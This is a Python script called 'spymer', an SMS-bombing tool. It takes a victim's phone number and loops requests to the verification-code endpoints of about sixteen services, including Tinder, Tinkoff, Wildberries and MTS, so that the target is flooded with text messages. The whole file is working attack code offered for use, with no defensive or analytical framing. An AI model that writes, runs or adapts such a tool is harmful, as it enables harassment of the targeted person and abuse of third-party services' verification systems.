#!/usr/bin/python
# spymer v3
# Author: FSystem88
class spymer:
	def main(self):
		import requests, random, datetime, sys, time, argparse
		from colorama import Fore, Back, Style
		print(Fore.GREEN + '8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888   SMS Spammer   8888\n8888      v.5.0      8888\n8888888888888888888888888\n8888888888888888888888888\n')
		print(Style.RESET_ALL)
		parser = argparse.ArgumentParser(prog='spymer', description="Fucking shit by FSystem88. Возможно что-то уже не работает. Только для России!",epilog='Мой e-mail - FSystem88@bk.ru')
		parser.add_argument('phonenum', metavar='phone', help='Телефонный номер жертвы (пример: 79991234455)')
		parser.add_argument('--text', help='Текст для некоторых сервисов (по умолчанию: Путин тебя любит ♥)')
		args = parser.parse_args()
		def showstatus(message, type='new'):
			now = datetime.datetime.now().strftime('%H:%M:%S')
			icon = '*'
			if type == 'warn':
				icon = '!'
			else:
				if type == 'new':
					icon == '*'
			message = '[' + icon + '][' + now + ']' + message
			return message
		def wrapsbrace(string, endspace=False):
			if endspace == True:
				return '[' + string + '] '
			return '[' + string + ']'
		def sleep(x):
			try:
				time.sleep(x)
			except KeyboardInterrupt:
				print('\r' + showstatus(wrapsbrace('except', True) + 'KeyboardInterrupt thrown! Exiting . . .', 'warn'))
				exit()
		_phone = args.phonenum
		if _phone[0] == '+':
			_phone = _phone[1:]
		if _phone[0] == '38':
			_phone = '38'+_phone[1:]
		if _phone[0] == '38':
			_phone = '38'+_phone
		
		_text = args.text
		if _text == None:
			_text = 'Путин тебя любит ♥'		
		_name = ''
		for x in range(12):
			_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		iteration = 0			
		_phone9 = _phone[1:]
		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
		print(showstatus(wrapsbrace('info', True) + ('Отправка SMS на: +{}').format(_phone)))
		print('Спамер запущен.\nЕсли Вы хотите остановить - нажмите Ctrl+Z.')
		i = 1
		iteration = 0
		while i < 10:
			_email = _name+f'{iteration}'+'@gmail.com'
			grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'})
			rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
			belka = requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
			tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			vkusvill = requests.post('https://mobile.vkusvill.ru:40113/api/user/', data={'Phone_number': _phone9,'version': '2'}, headers={})
			karusel = requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
			uramobil = requests.post('https://service.uramobil.ru/profile/smstoken', data={'PhoneNumber': _phone}, headers={})
			taxiseven = requests.post('http://taxiseven.ru/auth/register', data={'phone': _phone}, headers={})
			dostavista = requests.post('https://dostavista.ru/backend/send-verification-sms', data={'phone': _phone9dostavista}, headers={})
			tinkoff = requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
			worki = requests.post('https://api.iconjob.co/api/web/v1/verification_code', data={"phone": _phone}, headers={})
			wildberries = requests.post('https://security.wildberries.ru/mobile/requestconfirmcode?forAction=RegisterUser', data={"phone": '+'+_phone}, headers={})
			mts = requests.post('https://api.mtstv.ru/v1/users', data={'msisdn': _phone}, headers={})
			ostin = requests.get('https://ostin.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.js', data={'type':'sendConfirmCode', 'phoneNumber': _phoneOstin})
			ostin = requests.post('https://ostin.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp', params={'type': 'sendConfirmCode', 'phoneNumber': _phone})
			youla = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
			
			iteration += 1
			print(('{} круг пройден.').format(iteration))

spammer = spymer()
spammer.main()
